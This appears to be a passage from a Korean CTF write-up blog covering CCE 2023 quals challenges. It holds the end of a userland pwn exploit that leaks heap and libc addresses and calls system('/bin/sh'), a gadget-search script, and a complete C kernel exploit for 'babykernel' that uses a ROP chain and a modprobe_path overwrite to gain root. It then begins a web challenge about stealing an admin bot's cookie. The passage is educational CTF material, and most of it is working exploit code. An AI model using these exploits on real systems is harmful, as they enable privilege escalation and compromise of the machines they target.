0, 160, 0, 161, 0, 162, 0, 163, 0, 164, 0, 165, 0, 166, 0, 167, 0, 168, 0, 169, 0, 170, 0, 171, 0, 172, 0, 173, 0, 174, 0, 175, 0, 176, 0, 177, 0, 178, 0, 179, 0, 180, 0, 181, 0, 182, 0, 183, 0, 184, 0, 185, 0, 186, 0, 187, 0, 188, 0, 189, 0, 190, 0, 191, 0, 192, 0, 193, 0, 194, 0, 195, 0, 196, 0, 197, 0, 198, 0, 199, 0, 200, 0, 201, 0, 202, 0, 203, 0, 204, 0, 205, 0, 206, 0, 207, 0, 208, 0, 209, 0, 210, 0, 211, 0, 212, 0, 213, 0, 214, 0, 215, 0, 216, 0, 217, 0, 218, 0, 219, 0, 220, 0, 221, 0, 222, 0, 223, 0, 224, 0, 225, 0, 226, 0, 227, 0, 228, 0, 229, 0, 230, 0, 231, 0, 232, 0, 233, 0, 234, 0, 235, 0, 236, 0, 237, 0, 238, 0, 239, 0, 240, 0, 241, 0, 242, 0, 243, 0, 244, 0, 245, 0, 246, 0, 247, 0, 248, 0, 249, 0, 250, 0, 251, 0, 252, 0, 253, 0, 254, 0, 255, 0] word_29160 = [0, 0, 3, 0, 6, 0, 9, 0, 12, 0, 15, 0, 18, 0, 21, 0, 24, 0, 27, 0, 30, 0, 33, 0, 36, 0, 39, 0, 42, 0, 45, 0, 48, 0, 51, 0, 54, 0, 57, 0, 60, 0, 63, 0, 66, 0, 69, 0, 72, 0, 75, 0, 78, 0, 81, 0, 84, 0, 87, 0, 90, 0, 93, 0, 96, 0, 98, 0, 100, 0, 102, 0, 104, 0, 106, 0, 108, 0, 110, 0, 112, 0, 114, 0, 116, 0, 118, 0, 120, 0, 122, 0, 124, 0, 126, 0, 128, 0, 130, 0, 132, 0, 134, 0, 136, 0, 138, 0, 140, 0, 142, 0, 144, 0, 146, 0, 148, 0, 150, 0, 152, 0, 154, 0, 156, 0, 158, 0, 160, 0, 162, 0, 164, 0, 166, 0, 168, 0, 170, 0, 172, 0, 174, 0, 176, 0, 178, 0, 180, 0, 182, 0, 184, 0, 186, 0, 188, 0, 190, 0, 192, 0, 194, 0, 196, 0, 198, 0, 200, 0, 202, 0, 204, 0, 206, 0, 208, 0, 210, 0, 212, 0, 214, 0, 216, 0, 218, 0, 220, 0, 222, 0, 224, 0, 226, 0, 228, 0, 230, 0, 232, 0, 234, 0, 236, 0, 238, 0, 240, 0, 242, 0, 244, 0, 246, 0, 248, 0, 250, 0, 252, 0, 254, 0, 0, 1, 2, 1, 4, 1, 6, 1, 8, 1, 10, 1, 12, 1, 14, 1, 16, 1, 18, 1, 20, 1, 22, 1, 24, 1, 26, 1, 28, 1, 30, 1, 33, 1, 36, 1, 39, 1, 42, 1, 45, 1, 48, 1, 51, 1, 54, 1, 57, 1, 60, 1, 63, 1, 66, 1, 69, 1, 72, 1, 75, 1, 78, 1, 81, 1, 84, 1, 87, 1, 90, 1, 93, 1, 96, 1, 99, 1, 102, 1, 105, 1, 108, 1, 111, 1, 114, 1, 117, 1, 120, 1, 123, 1, 126, 1, 129, 1, 133, 1, 137, 1, 141, 1, 145, 1, 149, 1, 153, 1, 157, 1, 161, 1, 165, 1, 169, 1, 173, 1, 177, 1, 181, 1, 185, 1, 189, 1, 193, 1, 197, 1, 201, 1, 205, 1, 209, 1, 213, 1, 217, 1, 221, 1, 225, 1, 229, 1, 233, 1, 237, 1, 241, 1, 245, 1, 249, 1, 253, 1, 1, 2, 5, 2, 9, 2, 13, 2, 17, 2, 21, 2, 25, 2, 29, 2, 33, 2, 37, 2, 41, 2, 45, 2, 49, 2, 53, 2, 57, 2, 61, 2, 65, 2, 69, 2, 73, 2, 77, 2, 81, 2, 85, 2, 89, 2, 93, 2, 97, 2, 101, 2, 105, 2, 109, 2, 113, 2, 117, 2, 121, 2, 125, 2, 129, 2, 133, 2, 137, 2, 141, 2, 145, 2, 149, 2, 153, 2, 157, 2, 161, 2, 165, 2, 169, 2, 173, 2, 177, 2, 181, 2, 185, 2, 189, 2, 193, 2, 197, 2, 201, 2, 205, 2, 209, 2, 213, 2, 217, 2, 221, 2, 225, 2, 229, 2, 233, 2, 237, 2, 241, 2, 245, 2, 249, 2, 253, 2] for i in range(len(word_29160)//2): word_29160[i] = u16(bytes(word_29160[i*2:i*2+2])) word_29160 = word_29160[:len(word_29160)//2+1] for i in range(len(word_29780)//2): word_29780[i] = u16(bytes(word_29780[i*2:i*2+2])) word_29780 = word_29780[:len(word_29780)//2+1] if (x-0xa0)\u0026amp;0xffffffff \u0026lt;= 0x5f: v = [] for i in range(4): if unk_29360[word_29780[x-0x80\u0026amp;0xffffffff]+i] == 0: break v.append(unk_29360[word_29780[x-0x80\u0026amp;0xffffffff]+i]) return bytes(v) else: v = [] for i in range(4): if unk_29360[word_29160[x]+i] == 0: break v.append((unk_29360[word_29160[x]+i])) return bytes(v) def leak_bytes(raw_bytes : bytes, k : bytes, l : int) -\u0026gt; bytes: def parse(res, raw,l,idx,candidates): print(res) if len(res) \u0026gt; l: return None elif len(res) == l: return bytes(res) else: f = 0 for i in range(0x0,0x20): if raw[idx+len(res):idx+len(res)+2] == unctrl_sp_emu(i): res.append(i) v = (parse(res,raw,l,idx+1,candidates)) f = 1 if v != None: candidates.append(v) res.pop() for i in range(0x20,0x7f): if p8(raw[idx+len(res)]) == unctrl_sp_emu(i): res.append(i) v = (parse(res,raw,l,idx,candidates)) f = 1 if v != None: candidates.append(v) res.pop() for i in range(0x7f,0xa0): if raw[idx+len(res):idx+len(res)+2] == unctrl_sp_emu(i): res.append(i) v = (parse(res,raw,l,idx+1,candidates)) f = 1 if v != None: candidates.append(v) res.pop() for i in range(0xa0,0x100): if (raw[idx+len(res)]) == (i): res.append(i) v = (parse(res,raw,l,idx,candidates)) f = 1 if v != None: candidates.append(v) res.pop() if f==0: return None candidates = [] idx = raw_bytes.index(k) res = [] parse(res, raw_bytes, l, idx+len(k),candidates) return candidates # pwndbg\u0026gt; source ./addrsearch.py # addr : 0x55ad1bc7f6c0 # target addr start: 0x7f12897b8000 # target addr end : 0x7f1289765000 # # 0x55ad1bc7f6c0 | 0x7f12897b9ce0 -- offset : -0xe720 # 0x55ad1bc7f6c8 | 0x7f12897b9cf0 -- offset : -0xe718 # 0x55ad1bc7f6d0 | 0x7f12897b9d00 -- offset : -0xe710 # 0x55ad1bc7f6d8 | 0x7f12897b9d10 -- offset : -0xe708 # 0x55ad1bc7f6e0 | 0x7f12897b9d20 -- offset : -0xe700 # 0x55ad1bc7f808 | 0x7f128978bb20 -- offset : -0xe5d8 # 0x55ad1bc7f8f0 | 0x7f12897c4b50 -- offset : -0xe4f0 # 0x55ad1bc7f8f8 | 0x7f12897b9d50 -- offset : -0xe4e8 # 0x55ad1bc800f8 | 0x7f1289765680 -- offset : -0xdce8 # 0x55ad1bc80168 | 0x7f12897615e0 -- offset : -0xdc78 # 0x55ad1bc80260 | 0x7f12897610a0 -- offset : -0xdb80 # 0x55ad1bc8e9b0 | 0x7f1289764cc0 -- offset : 0xbd0 # 0x55ad1bc8e9b8 | 0x7f1289764cc0 -- offset : 0xbd8 # 0x55ad1bc8e9b8 | 0x7f1289764cc0 -- offset : 0xbd8 if __name__ == \u0026#39;__main__\u0026#39;: for i in range(5): print(solve(i+1)) rvuntil(b\u0026#39;Result\u0026#39;) s(b\u0026#39;\\xe0\u0026#39;) rv = rvuntil(b\u0026#39;1.\u0026#39;) addr = leak_bytes(rv,b\u0026#39;1. \u0026#39;,6) heap = 0 for i in addr: v = u64(i + b\u0026#39;\\x00\u0026#39;*2) if (v \u0026gt;\u0026gt; 8*5) == 0x55 or (v \u0026gt;\u0026gt; 8*5) == 0x56: if heap == 0: heap = v assert(heap != 0) success(\u0026#34;heap : \u0026#34; + hex(heap)) s(b\u0026#39;y\u0026#39;) for i in range(5): print(solve(i+1),\u0026#39;solved\u0026#39;) rvuntil(b\u0026#39;Result\u0026#39;) # constraint # addr-0x10+0x28 -\u0026gt; 0 # 0x55ad1bc7f6d8 | 0x7f12897b9d10 -- offset : -0xe708 s(b\u0026#39;A\u0026#39;*0x18 + p64(heap-0xe708-0x10)) rv = rvuntil(b\u0026#39;3. \u0026#39;) addr = (leak_bytes(rv,b\u0026#39;3. \u0026#39;,6)) libc_base = 0 for i in addr: v = u64(i + b\u0026#39;\\x00\u0026#39;*2) if (v \u0026gt;\u0026gt; 8*5) == 0x7f: if libc_base == 0: libc_base = v assert(libc_base != 0) libc_base -= 0x24bd10 success(\u0026#34;libc_base : \u0026#34; + hex(libc_base)) s(b\u0026#39;y\u0026#39;) for i in range(5): print(solve(i+1),\u0026#39;solved\u0026#39;) rvuntil(b\u0026#39;Result\u0026#39;) s(b\u0026#39;/bin/sh\\x00\u0026#39; + b\u0026#39;A\u0026#39;*0x10 + p64(libc_base + 0x1f6080-0x10)) s(b\u0026#39;n\u0026#39;) sl(b\u0026#39;3\u0026#39;) s(p64(libc_base + libc.sym.system)) pause() p.interactive() babykernel 궁금해서 문제 파일을 받아서 풀어봤다.\nAnalysis local_run.sh #!/bin/sh qemu-system-x86_64 \\ -m 128M \\ -cpu kvm64,+smep \\ -kernel bzImage \\ -initrd rootfs.img.gz \\ -snapshot \\ -nographic \\ -monitor /dev/null \\ -no-reboot \\ -append \u0026#34;console=ttyS0 kaslr kpti=1 quiet panic=1\u0026#34; \\ -s smap가 안걸려있다.\nbabykernel.ko copy_from_user(\u0026amp;user_struct, args, 0x18LL); switch ( (_DWORD)cmd ) { case 0x1002: v5 = (char *)\u0026amp;ops + 8 * *(\u0026amp;user_struct + 2); v6 = (_QWORD *)kmem_cache_alloc_trace(kmalloc_caches[18], 0x6000C0LL, 16LL); *v6 = v5; if ( (unsigned __int64)*(\u0026amp;user_struct + 1) \u0026gt; 0x10 ) _copy_overflow(16LL, *(\u0026amp;user_struct + 1)); else copy_to_user(user_struct, v6); break; case 0x1003: ((void (*)(void))((char *)\u0026amp;ops + 8 * *(\u0026amp;user_struct + 2)))();// relative ex break; case 0x1001: v4 = (_QWORD *)kmem_cache_alloc_trace(kmalloc_caches[18], 0x6000C0LL, 0x10LL); *v4 = \u0026amp;commit_creds; if ( (unsigned __int64)*(\u0026amp;user_struct + 1) \u0026lt;= 0x10 ) copy_to_user(user_struct, v4); break; } return 1LL; } 0x1002, 0x1001은 릭해주고, 0x1003은 ops에서 특정 오프셋만큼 떨어진 부분을 실행한다.\nExploitation ops쪽이랑 코드쪽 매핑을 릭하고 피보팅해주고 modprobe_path를 덮었다. bzImage를 vmlinux로 추출하려했는데, 안되길래 직접 rop gadgets을 찾는 스크립트를 작성해서 가젯을 잘 가져왔다.\nimport gdb from capstone import * from tqdm import tqdm import pickle default = \u0026#34;../res.rop\u0026#34; def brief(x,keywords): m = 0x7ffffffff M = -1 Ml = 0 for i in keywords: if m \u0026gt; x.index(i): m = x.index(i) if M \u0026lt; x.index(i): M = x.index(i) Ml = len(i) if m == -1 or M == -1: return None s,S = 0,0 if M+Ml+1 \u0026gt; len(x): S = 1 if m-21 \u0026lt; 0: s = 1 if s and not S: return x[:M+Ml+1] elif not s and S: i = m while True: if x[i] == \u0026#39;\\n\u0026#39;: i+=1 break i-=1 return x[i:] elif not s and not S: i = m while True: if x[i] == \u0026#39;\\n\u0026#39;: i+=1 break i-=1 return x[i:M+Ml+1] else: return x def parse_int(v): if v.startswith(\u0026#34;0x\u0026#34;): v = int(v,16) else: v = int(v,10) return v def search(s,sv): if sv: print(\u0026#34;save? (y/n) : \u0026#34;,end=\u0026#39;\u0026#39;) v = input() == \u0026#39;y\u0026#39; if v: with open(default,\u0026#34;wb\u0026#34;) as f: pickle.dump(s, f) print(\u0026#34;saved\u0026#34;) print() print(\u0026#34;Examples)\\n\\t1) array search :\\n\\t\\tSearch \u0026gt; [\u0026#39;xchg\u0026#39;,\u0026#39;esp\u0026#39;,\u0026#39;ret\u0026#39;]\\n\\t2) string search :\\n\\t\\tSearch \u0026gt; xchg esp\\n\\t3) quit :\\n\\t\\tSearch \u0026gt; q\\n\\t4) Save results :\\n\\t\\tSearch \u0026gt; save\u0026#34;) print() while True: print(\u0026#34;Search \u0026gt; \u0026#34;,end=\u0026#39;\u0026#39;) v = input() if v == \u0026#39;q\u0026#39;: break elif v.startswith(\u0026#39;[\u0026#39;): print(\u0026#34;limit : \u0026#34;,end=\u0026#39;\u0026#39;) limit = parse_int(input()) arr = eval(v) res = [] for i in s: f = 0 cur = -1 idx = [] for j in arr: if j not in i: f = 1 break else: if cur \u0026lt; i.index(j): idx.append(i.index(j)) cur = i.index(j) else: f = 1 if f==0: m = sum(idx) / len(idx) M = 0 t = 0 for k in idx: t = (m - k)**2 if M \u0026lt; t: M = t res.append([t,i]) print(\u0026#34;show brief (y/n) : \u0026#34;,end= \u0026#39;\u0026#39;) v = input() == \u0026#39;y\u0026#39; res.sort() if len(res) \u0026lt; limit: limit = len(res) for i in range(limit): if v: print() x= brief((res[i][1]),arr) if x == None: continue print(x) else: print() print((res[i][1])) else: print(\u0026#34;limit : \u0026#34;,end=\u0026#39;\u0026#39;) limit = parse_int(input()) for i in s: if v in i: print(i) if __name__ == \u0026#39;__main__\u0026#39;: print(\u0026#34;load? (y/n) : \u0026#34;,end=\u0026#39;\u0026#39;) v = input() == \u0026#39;y\u0026#39; if v: try: s = \u0026#39;\u0026#39; with open(default,\u0026#39;rb\u0026#39;) as f: s = pickle.load(f) print(\u0026#34;loaded successfully\u0026#34;) search(s,False) except FileNotFoundError: print(f\u0026#34;\u0026#39;{default}\u0026#39; not found\u0026#34;) else: inf = gdb.inferiors()[0] print(\u0026#34;segment address : \u0026#34;,end=\u0026#39;\u0026#39;) addr = parse_int(input()) res = gdb.execute(f\u0026#34;xinfo {addr}\u0026#34;,to_string=True) if \u0026#39;Containing mapping:\u0026#39; in res: res = res[res.index(\u0026#39;0x\u0026#39;)+2:] res = res[res.index(\u0026#39;0x\u0026#39;):].split() print(f\u0026#34;reading memory {res[0]} ~ {res[1]} (0x{res[3]} bytes)\u0026#34;) mem = (inf.read_memory(int(res[0],16),int(res[3],16))).tobytes() md = Cs(CS_ARCH_X86, CS_MODE_64) #gadgets = [b\u0026#39;\\xc3\u0026#39;,b\u0026#34;\\xc2\u0026#34;,b\u0026#39;\\xcb\u0026#39;,b\u0026#34;\\xca\u0026#34;,b\u0026#39;\\xf2\\xc3\u0026#39;,b\u0026#34;\\xf2\\xc2\u0026#34;,b\u0026#39;\\xff\u0026#39;,b\u0026#39;\\xeb\u0026#39;,b\u0026#39;\\xe9\u0026#39;,b\u0026#39;\\xf2\\xff\u0026#39;,b\u0026#39;\\xcd\\x80\u0026#39;,b\u0026#34;\\x0f\\x34\u0026#34;,b\u0026#34;\\x0f\\x05\u0026#34;,b\u0026#39;\\x65\\xff\\x15\\x10\\x00\\x00\\x00\u0026#39;] gadgets = [b\u0026#39;\\xc3\u0026#39;,b\u0026#34;\\xc2\u0026#34;,b\u0026#39;\\xcb\u0026#39;,b\u0026#34;\\xca\u0026#34;,b\u0026#39;\\xff\u0026#39;,b\u0026#39;\\xeb\u0026#39;,b\u0026#39;\\xe9\u0026#39;,b\u0026#39;\\xf2\u0026#39;,b\u0026#39;\\xcd\u0026#39;,b\u0026#39;\\x0f\u0026#39;,b\u0026#39;\\x65\u0026#39;,b\u0026#39;\\x48\u0026#39;] # iretq candi = [] print(\u0026#34;finding gadgets\u0026#34;) for i in tqdm(range(len(mem))): for k in gadgets: if mem[i] == k[0] and i not in candi: candi.append(i) s = [] base = int(res[0],16) # print(\u0026#34;width : \u0026#34;,end=\u0026#39;\u0026#39;) # v = parse_int(input()) v = 0x20 # width 0x20 by default print(\u0026#34;disassembling\u0026#34;) for j in tqdm(range(len(candi))): tmp = \u0026#39;\u0026#39; if j-v \u0026lt; 0: for i in md.disasm(mem[:candi[j]+v], base): tmp += (\u0026#34;%s:\\t%s %s\\n\u0026#34; %(\u0026#39;0x\u0026#39;+hex(i.address).replace(\u0026#39;0x\u0026#39;,\u0026#39;\u0026#39;).zfill(16) + \u0026#39; (+\u0026#39;+ hex(i.address-base)+\u0026#39;)\u0026#39;, i.mnemonic, i.op_str)) else: for i in md.disasm(mem[candi[j]-v:candi[j]+v], base+candi[j]-v): tmp += (\u0026#34;%s:\\t%s %s\\n\u0026#34; %(\u0026#39;0x\u0026#39;+hex(i.address).replace(\u0026#39;0x\u0026#39;,\u0026#39;\u0026#39;).zfill(16) + \u0026#39; (+\u0026#39;+ hex(i.address-base)+\u0026#39;)\u0026#39;, i.mnemonic, i.op_str)) s.append(tmp) search(s,True) else: print(\u0026#34;not mapped\u0026#34;) Exploit script #include\u0026lt;sys/ioctl.h\u0026gt; #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;stdint.h\u0026gt; #include\u0026lt;string.h\u0026gt; #include\u0026lt;unistd.h\u0026gt; #include\u0026lt;fcntl.h\u0026gt; #include\u0026lt;sys/mman.h\u0026gt; #define LEAK 0x1001 #define EXEC 0x1003 #define READ 0x1002 // -no-pie struct ioinfo { uint8_t * buf; uint64_t size; uint64_t off; }; uint64_t user_cs, user_rflags, user_ss,user_rsp; void shell(void){ system(\u0026#34;echo \u0026#39;#!/bin/sh\\nchmod 777 /flag\u0026#39; \u0026gt; /tmp/x\u0026#34;); system(\u0026#34;chmod +x /tmp/x\u0026#34;); system(\u0026#34;echo -ne \u0026#39;\\\\xff\\\\xff\\\\xff\\\\xff\u0026#39; \u0026gt; /tmp/v\u0026#34;); system(\u0026#34;chmod +x /tmp/v\u0026#34;); system(\u0026#34;/tmp/v\u0026#34;); system(\u0026#34;cat /flag\u0026#34;); exit(0); } void save_state(){ __asm__ __volatile__ ( \u0026#34;.intel_syntax noprefix;\u0026#34; \u0026#34;mov user_cs, cs;\u0026#34; \u0026#34;pushf;\u0026#34; \u0026#34;pop user_rflags;\u0026#34; \u0026#34;mov user_rsp, rsp;\u0026#34; \u0026#34;mov user_ss, ss;\u0026#34; \u0026#34;.att_syntax;\u0026#34; ); } int main(){ int fd = open(\u0026#34;/dev/babykernel\u0026#34;,O_RDONLY); if (fd == -1) return -1; struct ioinfo info; save_state(); info.buf = (uint8_t *)malloc(0x10); info.size = 0x8; ioctl(fd, LEAK, \u0026amp;info); uint64_t commit_creds = *(uint64_t *)info.buf; info.off = 0x0; ioctl(fd, READ, \u0026amp;info); uint64_t ops = *(uint64_t *)info.buf; printf(\u0026#34;commit_creds : 0x%lx\\nops : 0x%lx\\n\u0026#34;,commit_creds,ops); free(info.buf); uint64_t base = commit_creds \u0026amp;0xfffffffffff00000; uint64_t xchg_esp = base + 0x605240; // pwndbg\u0026gt; x/10xi 0xffffffff89205240 // 0xffffffff89205240: xchg esp,eax // 0xffffffff89205241: ret info.off = (xchg_esp - ops) / 8; uint64_t * stack = mmap((void *)((xchg_esp \u0026amp; 0xffff0000)-0x5000), 0x10000,7,MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,-1,0); uint64_t * stack1 = mmap((void *)((xchg_esp \u0026amp; 0xffff0000)), 0x10000,7,MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,-1,0); // merge mem if (!stack) exit(-1); printf(\u0026#34;fake_stack : %p\\n\u0026#34;,stack); uint64_t st = (xchg_esp \u0026amp; 0xffffffff); *((uint64_t *)(st + 0x00)) = base + 0x8197fd; *((uint64_t *)(st + 0x08)) = base + 0x1a8b340; *((uint64_t *)(st + 0x10)) = base + 0x44b12; *((uint64_t *)(st + 0x18)) = ((xchg_esp \u0026amp; 0xffffffff) + 0x500); *((uint64_t *)(st + 0x20)) = base + 0x1c4203; *((uint64_t *)(st + 0x28)) = 0x1; *((uint64_t *)(st + 0x30)) = base + 0x72b6f7; // rep movsq qword ptr [rdi], qword ptr [rsi] *((uint64_t *)(st + 0x38)) = base + 0x1001144; *((uint64_t *)(st + 0x40)) = 0x0; *((uint64_t *)(st + 0x48)) = 0x0; *((uint64_t *)(st + 0x50)) = (uint64_t)\u0026amp;shell; *((uint64_t *)(st + 0x58)) = user_cs; *((uint64_t *)(st + 0x60)) = user_rflags; *((uint64_t *)(st + 0x68)) = user_rsp; *((uint64_t *)(st + 0x70)) = user_ss; *(uint64_t *)((xchg_esp \u0026amp; 0xffffffff) + 0x500) = 0x782f706d742f; ioctl(fd, EXEC, \u0026amp;info); return 0; } ","permalink":"https://msh1307.kr/blog/cce_2023_junior_quals/","summary":"K-Exploit 처음으로 잡아본 커널 문제다. 대회끝나고 50분뒤에 플래그가 나왔다. 아침에 BoB 필기랑 인적성보고 풀려했는데, 대회가 너무 빨리 끝났다. ;;\nAnalysis rootfs.img.gz 파일 시스템이 주어지고 bzImage가 주어진다.\nlocal_run.sh #!/bin/sh qemu-system-x86_64 \\ -m 128M \\ -cpu kvm64,+smep,+smap \\ -kernel bzImage \\ -initrd rootfs.img.gz \\ -snapshot \\ -nographic \\ -monitor /dev/null \\ -no-reboot \\ -append \u0026#34;console=ttyS0 kaslr kpti=1 quiet panic=1\u0026#34; \\ -s kaslr, kpti, smep, smap 다 빡세게 걸려있다.\nserver_run.sh #!/bin/sh qemu-system-x86_64 \\ -m 128M \\ -cpu kvm64,+smep,+smap \\ -kernel bzImage \\ -initrd $1 \\ -snapshot \\ -nographic \\ -monitor /dev/null \\ -no-reboot \\ -append \u0026#34;console=ttyS0 kaslr kpti=1 quiet panic=1\u0026#34; 똑같은데 디버깅 옵션만 빠진거같다.","title":"CCE 2023 Quals"},{"content":"painter 유사 그림판 컨셉인듯 하다. Web Assembly 익스플로잇해서 admin bot의 쿠키 탈취가 목적이다. Wasm 취약점 분석은 처음 해봐서 생소했다. admin-bot.js 파일과 dockerfile, app.py, index.wasm 등이 주어진다.\nAnalysis admin-bot.js import flag from \u0026#39;./flag.txt\u0026#39;; function sleep(time) { return new Promise(resolve =\u0026gt; { setTimeout(resolve, time); }); } export default { id: \u0026#39;painter\u0026#39;, name: \u0026#39;painter\u0026#39;, urlRegex: /^https:\\/\\/painter\\.tjc\\.tf\\//, timeout: 10000, handler: async (url, ctx) =\u0026gt; { const page = await ctx.newPage(); await page.goto(\u0026#39;https://painter.tjc.tf\u0026#39;, { waitUntil: \u0026#39;domcontentloaded\u0026#39; }); await page.setCookie({ name: \u0026#39;flag\u0026#39;, value: flag.trim(), domain: \u0026#39;painter.tjc.tf\u0026#39;, }); await sleep(1000); await page.goto(url, { timeout: 10000, waitUntil: \u0026#39;domcontentloaded\u0026#39; }); await sleep(10000); } }; admin bot 사이트 접속하면 url을 받아서 거기에 요청을 보내는 것을 알 수 있다. 쿠키에 flag가 들어있다. 쿠키 탈취가 목적이다.\nDockerfile FROM python:3.8.5-slim-buster RUN pip install flask gunicorn WORKDIR /app COPY . . EXPOSE 5000 ENTRYPOINT [\u0026#34;gunicorn\u0026#34;, \u0026#34;-b\u0026#34;, \u0026#34;0.0.0.0:5000\u0026#34;, \u0026#34;-t\u0026#34;, \u0026#34;4\u0026#34;, \u0026#34;app:app\u0026#34;] app.py from flask import Flask, render_template, redirect, request from uuid import uuid4 app = Flask(__name__) images = {} @app.route(\u0026#39;/\u0026#39;) def index(): return render_template(\u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/save\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def post_image(): img, name = request.json[\u0026#39;img\u0026#39;], request.json[\u0026#39;name\u0026#39;] id = uuid4() images[id] = { \u0026#39;img\u0026#39;: img, \u0026#39;name\u0026#39;: name } return redirect(\u0026#39;/img/\u0026#39; + str(id)) @app.route(\u0026#39;/img/\u0026lt;uuid:id\u0026gt;\u0026#39;) def image_id(id): if id not in images: return redirect(\u0026#39;/\u0026#39;) img = images[id][\u0026#39;img\u0026#39;] name = images[id][\u0026#39;name\u0026#39;] return render_template(\u0026#39;index.html\u0026#39;, px=img, name=name, saved=True) if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=True) 이미지를 저장하거나 볼 수 있는 것 같다.\nindex.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html; charset=utf-8\u0026#34;\u0026gt; \u0026lt;style\u0026gt; body { height: 100vh; width: 100%; margin: 0; display: grid; justify-items: center; align-items: center; text-align: left; } #options { display: flex; flex-direction: row; justify-content: space-between; } #canvas { border: 1px solid black; height: 75vh; max-height: 1000px; image-rendering: pixelated; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h1 id=\u0026#34;name-h1\u0026#34;\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;canvas id=\u0026#34;canvas\u0026#34; tabindex=\u0026#34;-1\u0026#34;\u0026gt;\u0026lt;/canvas\u0026gt; \u0026lt;div\u0026gt; \u0026lt;input type=\u0026#34;color\u0026#34; id=\u0026#34;color-picker\u0026#34;\u0026gt; \u0026lt;select id=\u0026#34;layers\u0026#34;\u0026gt; \u0026lt;option value=\u0026#34;0\u0026#34;\u0026gt;Top Layer\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;1\u0026#34;\u0026gt;Middle Layer\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;2\u0026#34;\u0026gt;Bottom Layer\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;name\u0026#34; placeholder=\u0026#34;Name\u0026#34;\u0026gt; \u0026lt;button id=\u0026#34;save\u0026#34;\u0026gt;Save\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; const canvas = document.getElementById(\u0026#39;canvas\u0026#39;); Module = { canvas: canvas }; window.addEventListener(\u0026#39;keydown\u0026#39;, (e) =\u0026gt; { e.stopImmediatePropagation(); }, true); window.addEventListener(\u0026#39;keyup\u0026#39;, (e) =\u0026gt; { e.stopImmediatePropagation(); }, true); const strToCharArr = (str) =\u0026gt; { const ptr = _malloc(str.length + 1); Module.stringToUTF8(str, ptr, str.length + 1); return ptr; }; const base64ToArr = (enc) =\u0026gt; { const binary = atob(enc); const bytes = new Uint8Array(binary.length); for (let i = 0; i \u0026lt; bytes.length; i++) { bytes[i] = binary.charCodeAt(i); } return bytes; } const arrToCharArr = (arr) =\u0026gt; { const ptr = _malloc(arr.length); Module.writeArrayToMemory(arr, ptr); return ptr; } const setName = () =\u0026gt; { const name = UTF8ToString(_getName()); document.getElementById(\u0026#39;name-h1\u0026#39;).innerHTML = name; } Module.onRuntimeInitialized = () =\u0026gt; { _clearCanvas(); {% if saved %} const px = \u0026#39;{{ px }}\u0026#39;; const name = \u0026#39;{{ name }}\u0026#39;; _clearCanvas(); const bin = base64ToArr(px); // get img binary const arr = arrToCharArr(bin); _copyCanvas(arr, bin.length); _setName(strToCharArr(name), name.length); {% endif %} document.addEventListener(\u0026#39;mousemove\u0026#39;, (e) =\u0026gt; { const rect = canvas.getBoundingClientRect(); const scale = canvas.width / rect.width; _draw((e.clientX - rect.left) * scale, (e.clientY - rect.top) * scale); }); document.addEventListener(\u0026#39;mousedown\u0026#39;, (e) =\u0026gt; { _toggleLeftMouseButton(1); }); document.addEventListener(\u0026#39;mouseup\u0026#39;, (e) =\u0026gt; { _toggleLeftMouseButton(0); }); document.getElementById(\u0026#39;color-picker\u0026#39;).addEventListener(\u0026#39;input\u0026#39;, (e) =\u0026gt; { const c = e.target.value.match(/[0-9a-fA-F]{2}/g).map(v =\u0026gt; parseInt(v, 16)); _setColor(...c); }); document.getElementById(\u0026#39;layers\u0026#39;).addEventListener(\u0026#39;change\u0026#39;, (e) =\u0026gt; { _setLayer(parseInt(e.target.value)); }); document.getElementById(\u0026#39;name\u0026#39;).addEventListener(\u0026#39;input\u0026#39;, (e) =\u0026gt; { const name = e.target.value; _setName(strToCharArr(name), name.length); }); document.getElementById(\u0026#39;save\u0026#39;).addEventListener(\u0026#39;click\u0026#39;, (e) =\u0026gt; { const out = new Uint8Array(4 * canvas.width * canvas.height * 3); for (let i = 0; i \u0026lt; 3; i++) { const layerPtr = _getLayer(i); const layer = new Uint8Array(Module.HEAPU8.buffer, layerPtr, 4 * canvas.width * canvas.height); out.set(layer, 4 * canvas.width * canvas.height * i); } const binary = btoa(String.fromCharCode(...out)); const name = document.getElementById(\u0026#39;name\u0026#39;).value; fetch(\u0026#39;/save\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, body: JSON.stringify({ name: name, img: binary }) }).then((res) =\u0026gt; { if (res.status === 200) { navigator.clipboard.writeText(res.url); alert(\u0026#39;Save URL copied to clipboard!\u0026#39;); } else { alert(\u0026#39;Failed to save!\u0026#39;); } }); }) }; \u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;/static/index.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 저장할때 /save로 보내는 것을 알 수 있다. wasm function들을 사용해서 처리한다. index.js에서 export 하는 부분을 확인할 수 있다.\nindex.js ... var asm = createWasm(); /** @type {function(...*):?} */ var ___wasm_call_ctors = createExportWrapper(\u0026#34;__wasm_call_ctors\u0026#34;); /** @type {function(...*):?} */ var _getName = Module[\u0026#34;_getName\u0026#34;] = createExportWrapper(\u0026#34;getName\u0026#34;); /** @type {function(...*):?} */ var _getLayer = Module[\u0026#34;_getLayer\u0026#34;] = createExportWrapper(\u0026#34;getLayer\u0026#34;); /** 